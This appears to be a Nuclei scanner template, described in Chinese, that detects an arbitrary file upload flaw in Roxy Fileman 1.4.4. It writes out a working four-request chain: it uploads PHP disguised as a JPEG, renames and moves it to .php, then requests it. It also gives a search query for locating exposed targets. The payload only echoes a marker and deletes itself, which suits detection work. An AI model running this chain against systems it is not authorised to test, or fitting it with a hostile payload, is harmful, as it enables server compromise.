id: roxyfileman-fileupload

info:
  name: Roxy Fileman 1.4.4 任意文件上传
  author: DhiyaneshDK
  severity: high
  description: |
    该模板用于核查 Roxy Fileman 1.4.4 任意文件上传。该类问题通常源于高危管理接口未授权开放、危险方法启用或可写接口暴露，攻击者可借助接口能力写入文件或触发命令执行。模板会向目标发送探测请求，并依据匹配 `99acb46eabd01958e22fae1792e83ca9`、匹配 `text/html`、状态码 200 等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可能上传文件、执行命令、提交任务或控制目标服务。
    - 成功利用后可导致主机沦陷、数据泄露、横向移动和业务中断。
  remediation: |
    - 立即为相关接口启用认证授权并限制可信来源访问。
    - 关闭不必要的危险 HTTP 方法、远程执行能力和可写管理接口。
    - 检查系统进程、上传目录和访问日志，清理异常文件并轮换凭据。
  reference:
    - https://www.exploit-db.com/exploits/39963
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-434
  metadata:
    verified: true
    max-request: 4
    google-query: intitle:"Roxy file manager"
  tags: misconfig,edb,roxy,fileman,rce,fileupload,intrusive,vuln

http:
  - raw:
      - |
        POST /php/upload.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6rbEqFAMRkE0RAB7

        ------WebKitFormBoundary6rbEqFAMRkE0RAB7
        Content-Disposition: form-data; name="action"

        upload
        ------WebKitFormBoundary6rbEqFAMRkE0RAB7
        Content-Disposition: form-data; name="method"

        ajax
        ------WebKitFormBoundary6rbEqFAMRkE0RAB7
        Content-Disposition: form-data; name="d"

        /app/Uploads
        ------WebKitFormBoundary6rbEqFAMRkE0RAB7
        Content-Disposition: form-data; name="files[]"; filename="{{randstr}}.jpg"
        Content-Type: image/jpeg

        <?php
        echo md5('roxyfileman-fileupload');unlink(__FILE__);
        ?>

        ------WebKitFormBoundary6rbEqFAMRkE0RAB7--
      - |
        POST /php/renamefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest

        f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php
      - |
        POST /php/movefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest

        f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php
      - |
        GET /Uploads/{{randstr}}.php HTTP/1.1
        Host: {{Hostname}}

    host-redirects: true
    max-redirects: 2

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "99acb46eabd01958e22fae1792e83ca9"

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
